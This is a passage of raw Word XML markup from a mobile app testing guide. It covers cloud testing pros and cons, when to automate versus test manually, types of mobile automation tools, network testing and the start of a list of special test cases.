          <w:t>Cloud computing is cost-efficient, easy to use, maintain and update.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00EB3DF2" w:rsidRPr="00EB3DF2" w:rsidRDefault="00EB3DF2" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="98"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:ins w:id="406" w:author="Unknown"/>
          <w:rFonts w:cstheme="minorHAnsi"/>
          <w:color w:val="222222"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="407" w:author="Unknown">
        <w:r w:rsidRPr="00EB3DF2">
          <w:rPr>
            <w:rFonts w:cstheme="minorHAnsi"/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>Fast and quick deployment.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00EB3DF2" w:rsidRPr="00EB3DF2" w:rsidRDefault="00EB3DF2" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="98"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:ins w:id="408" w:author="Unknown"/>
          <w:rFonts w:cstheme="minorHAnsi"/>
          <w:color w:val="222222"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="409" w:author="Unknown">
        <w:r w:rsidRPr="00EB3DF2">
          <w:rPr>
            <w:rFonts w:cstheme="minorHAnsi"/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>Web-based interface.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00EB3DF2" w:rsidRDefault="00EB3DF2" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="98"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:cstheme="minorHAnsi"/>
          <w:color w:val="222222"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="410" w:author="Unknown">
        <w:r w:rsidRPr="00EB3DF2">
          <w:rPr>
            <w:rFonts w:cstheme="minorHAnsi"/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>Can run the same script on several devices in parallel.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00EB3DF2" w:rsidRPr="00EB3DF2" w:rsidRDefault="00EB3DF2" w:rsidP="00EB3DF2">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:ins w:id="411"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12" w:author="Unknown"/>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:color w:val="222222"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="413" w:author="Unknown">
        <w:r w:rsidRPr="00EB3DF2">
          <w:rPr>
            <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
            <w:b/>
            <w:bCs/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>Cons</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00EB3DF2" w:rsidRPr="00EB3DF2" w:rsidRDefault="00EB3DF2" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="99"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:ins w:id="414" w:author="Unknown"/>
          <w:rFonts w:cstheme="minorHAnsi"/>
          <w:color w:val="222222"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="415" w:author="Unknown">
        <w:r w:rsidRPr="00EB3DF2">
          <w:rPr>
            <w:rFonts w:cstheme="minorHAnsi"/>
            <w:b/>
            <w:bCs/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>Less control</w:t>
        </w:r>
        <w:r w:rsidRPr="00EB3DF2">
          <w:rPr>
            <w:rFonts w:cstheme="minorHAnsi"/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>– Since the application runs on the remote or third-party environment, the user has limited control and access over the functions.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00EB3DF2" w:rsidRPr="00EB3DF2" w:rsidRDefault="00EB3DF2" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="99"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:ins w:id="416" w:author="Unknown"/>
          <w:rFonts w:cstheme="minorHAnsi"/>
          <w:color w:val="222222"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="417" w:author="Unknown">
        <w:r w:rsidRPr="00EB3DF2">
          <w:rPr>
            <w:rFonts w:cstheme="minorHAnsi"/>
            <w:b/>
            <w:bCs/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>Internet connectivity issues</w:t>
        </w:r>
        <w:r w:rsidRPr="00EB3DF2">
          <w:rPr>
            <w:rFonts w:cstheme="minorHAnsi"/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>– the setup is on the Internet. Network issues affect the availability and functioning</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00EB3DF2" w:rsidRDefault="00EB3DF2" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="99"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:cstheme="minorHAnsi"/>
          <w:color w:val="222222"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="418" w:author="Unknown">
        <w:r w:rsidRPr="00EB3DF2">
          <w:rPr>
            <w:rFonts w:cstheme="minorHAnsi"/>
            <w:b/>
            <w:bCs/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>Security and privacy Issues</w:t>
        </w:r>
        <w:r w:rsidRPr="00EB3DF2">
          <w:rPr>
            <w:rFonts w:cstheme="minorHAnsi"/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>– Cloud computing is an Internet computing and nothing on the Internet is completing secure, so chances of data hacking are more.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00EB3DF2" w:rsidRPr="00EB3DF2" w:rsidRDefault="00EB3DF2" w:rsidP="00EB3DF2">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:ins w:id="419"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20" w:author="Unknown"/>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:color w:val="222222"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="421" w:author="Unknown">
        <w:r w:rsidRPr="00EB3DF2">
          <w:rPr>
            <w:rStyle w:val="Strong"/>
            <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>5) </w:t>
        </w:r>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"http://www.softwaretestinghelp.com/manual-and-automation-testing-challenges/" \o "Manual vs automation testing"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 xml:space="preserve">Automation vs. </w:t>
        </w:r>
        <w:proofErr w:type="gramStart"/>
        <w:r w:rsidRPr="00EB3DF2">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
            <w:b/>
            <w:bCs/>
            <w:color w:val="777777"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
            <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
          </w:rPr>
          <w:t>Manual</w:t>
        </w:r>
        <w:proofErr w:type="gramEnd"/>
        <w:r w:rsidRPr="00EB3DF2">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
            <w:b/>
            <w:bCs/>
            <w:color w:val="777777"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
            <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
          </w:rPr>
          <w:t xml:space="preserve"> testing</w:t>
        </w:r>
        <w:r w:rsidRPr="00EB3DF2">
          <w:rPr>
            <w:rStyle w:val="Strong"/>
            <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00EB3DF2" w:rsidRPr="00EB3DF2" w:rsidRDefault="00EB3DF2" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="100"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:ins w:id="422" w:author="Unknown"/>
          <w:rFonts w:cstheme="minorHAnsi"/>
          <w:color w:val="222222"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="423" w:author="Unknown">
        <w:r w:rsidRPr="00EB3DF2">
          <w:rPr>
            <w:rFonts w:cstheme="minorHAnsi"/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>If the application contains new functionality, test it manually.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00EB3DF2" w:rsidRPr="00EB3DF2" w:rsidRDefault="00EB3DF2" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="100"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:ins w:id="424" w:author="Unknown"/>
          <w:rFonts w:cstheme="minorHAnsi"/>
          <w:color w:val="222222"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="425" w:author="Unknown">
        <w:r w:rsidRPr="00EB3DF2">
          <w:rPr>
            <w:rFonts w:cstheme="minorHAnsi"/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>If the application requires testing once or twice, do it manually.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00EB3DF2" w:rsidRPr="00EB3DF2" w:rsidRDefault="00EB3DF2" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="100"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:ins w:id="426" w:author="Unknown"/>
          <w:rFonts w:cstheme="minorHAnsi"/>
          <w:color w:val="222222"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="427" w:author="Unknown">
        <w:r w:rsidRPr="00EB3DF2">
          <w:rPr>
            <w:rFonts w:cstheme="minorHAnsi"/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>Automate the scripts for regression test cases. If regression tests are repeated, automated testing is perfect for that.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00EB3DF2" w:rsidRDefault="00EB3DF2" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="100"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:cstheme="minorHAnsi"/>
          <w:color w:val="222222"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="428" w:author="Unknown">
        <w:r w:rsidRPr="00EB3DF2">
          <w:rPr>
            <w:rFonts w:cstheme="minorHAnsi"/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>Automate the scripts for complex scenarios which are time-consuming if executed manually.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00EB3DF2" w:rsidRPr="00EB3DF2" w:rsidRDefault="00EB3DF2" w:rsidP="00EB3DF2">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:ins w:id="429"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30" w:author="Unknown"/>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:color w:val="222222"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="431" w:author="Unknown">
        <w:r w:rsidRPr="00EB3DF2">
          <w:rPr>
            <w:rStyle w:val="Strong"/>
            <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>Two kinds of automation tools are available to test mobile apps:</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00EB3DF2" w:rsidRPr="00EB3DF2" w:rsidRDefault="00EB3DF2" w:rsidP="00EB3DF2">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0"/>
        <w:rPr>
          <w:ins w:id="432" w:author="Unknown"/>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:color w:val="222222"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:ins w:id="433" w:author="Unknown">
        <w:r w:rsidRPr="00EB3DF2">
          <w:rPr>
            <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
            <w:b/>
            <w:bCs/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>Object-based mobile testing tools</w:t>
        </w:r>
        <w:r w:rsidRPr="00EB3DF2">
          <w:rPr>
            <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>– automation by mapping elements on the device screen into objects.</w:t>
        </w:r>
        <w:proofErr w:type="gramEnd"/>
        <w:r w:rsidRPr="00EB3DF2">
          <w:rPr>
            <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t xml:space="preserve"> This approach is independent of screen size and mainly used for Android devices.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00EB3DF2" w:rsidRPr="00EB3DF2" w:rsidRDefault="00EB3DF2" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="101"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:ins w:id="434" w:author="Unknown"/>
          <w:rFonts w:cstheme="minorHAnsi"/>
          <w:color w:val="222222"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:ins w:id="435" w:author="Unknown">
        <w:r w:rsidRPr="00EB3DF2">
          <w:rPr>
            <w:rFonts w:cstheme="minorHAnsi"/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>Eg</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="00EB3DF2">
          <w:rPr>
            <w:rFonts w:cstheme="minorHAnsi"/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t xml:space="preserve">:- </w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="00EB3DF2">
          <w:rPr>
            <w:rFonts w:cstheme="minorHAnsi"/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>Ranorex</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="00EB3DF2">
          <w:rPr>
            <w:rFonts w:cstheme="minorHAnsi"/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t xml:space="preserve">, </w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="00EB3DF2">
          <w:rPr>
            <w:rFonts w:cstheme="minorHAnsi"/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>jamo</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="00EB3DF2">
          <w:rPr>
            <w:rFonts w:cstheme="minorHAnsi"/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t xml:space="preserve"> solution</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00EB3DF2" w:rsidRPr="00EB3DF2" w:rsidRDefault="00EB3DF2" w:rsidP="00EB3DF2">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0"/>
        <w:rPr>
          <w:ins w:id="436" w:author="Unknown"/>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:color w:val="222222"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="437" w:author="Unknown">
        <w:r w:rsidRPr="00EB3DF2">
          <w:rPr>
            <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
            <w:b/>
            <w:bCs/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>Image-based mobile testing tools</w:t>
        </w:r>
        <w:r w:rsidRPr="00EB3DF2">
          <w:rPr>
            <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>– create automation scripts based on screen coordinates of elements.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00EB3DF2" w:rsidRDefault="00EB3DF2" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="102"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:cstheme="minorHAnsi"/>
          <w:color w:val="222222"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:ins w:id="438" w:author="Unknown">
        <w:r w:rsidRPr="00EB3DF2">
          <w:rPr>
            <w:rFonts w:cstheme="minorHAnsi"/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>Eg</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="00EB3DF2">
          <w:rPr>
            <w:rFonts w:cstheme="minorHAnsi"/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t xml:space="preserve">:- </w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="00EB3DF2">
          <w:rPr>
            <w:rFonts w:cstheme="minorHAnsi"/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>Sikuli</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="00EB3DF2">
          <w:rPr>
            <w:rFonts w:cstheme="minorHAnsi"/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t xml:space="preserve">, Egg Plant, </w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="00EB3DF2">
          <w:rPr>
            <w:rFonts w:cstheme="minorHAnsi"/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>RoutineBot</w:t>
        </w:r>
      </w:ins>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w:rsidR="00EB3DF2" w:rsidRPr="00EB3DF2" w:rsidRDefault="00EB3DF2" w:rsidP="00EB3DF2">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:ins w:id="439"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40" w:author="Unknown"/>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:color w:val="222222"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="441" w:author="Unknown">
        <w:r w:rsidRPr="00EB3DF2">
          <w:rPr>
            <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
            <w:b/>
            <w:bCs/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>6) Network</w:t>
        </w:r>
        <w:r w:rsidRPr="00EB3DF2">
          <w:rPr>
            <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t> </w:t>
        </w:r>
        <w:r w:rsidRPr="00EB3DF2">
          <w:rPr>
            <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
            <w:b/>
            <w:bCs/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>configuration</w:t>
        </w:r>
        <w:r w:rsidRPr="00EB3DF2">
          <w:rPr>
            <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t> is also the necessary part of mobile testing. It’s important to validate the application on different networks like 2G, 3G, 4G or WIFI.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00EB3DF2" w:rsidRPr="00EB3DF2" w:rsidRDefault="00EB3DF2" w:rsidP="00EB3DF2">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:line="267" w:lineRule="atLeast"/>
        <w:rPr>
          <w:ins w:id="442" w:author="Unknown"/>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:color w:val="000000"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="443" w:author="Unknown">
        <w:r w:rsidRPr="00EB3DF2">
          <w:rPr>
            <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
            <w:color w:val="000000"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:lastRenderedPageBreak/>
          <w:t>Test Cases for Testing a Mobile App</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00EB3DF2" w:rsidRPr="00EB3DF2" w:rsidRDefault="00EB3DF2" w:rsidP="00EB3DF2">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="369" w:afterAutospacing="0"/>
        <w:rPr>
          <w:ins w:id="444" w:author="Unknown"/>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:color w:val="222222"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="445" w:author="Unknown">
        <w:r w:rsidRPr="00EB3DF2">
          <w:rPr>
            <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>In addition to functionality based test cases, Mobile application testing requires special test cases which should cover following scenarios.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00EB3DF2" w:rsidRPr="00EB3DF2" w:rsidRDefault="00EB3DF2" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="103"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:ins w:id="446" w:author="Unknown"/>
          <w:rFonts w:cstheme="minorHAnsi"/>
          <w:color w:val="222222"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="447" w:author="Unknown">
        <w:r w:rsidRPr="00EB3DF2">
          <w:rPr>
            <w:rFonts w:cstheme="minorHAnsi"/>
            <w:b/>
            <w:bCs/>
            <w:color w:val="222222"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>Battery usage</w:t>
        </w:r>
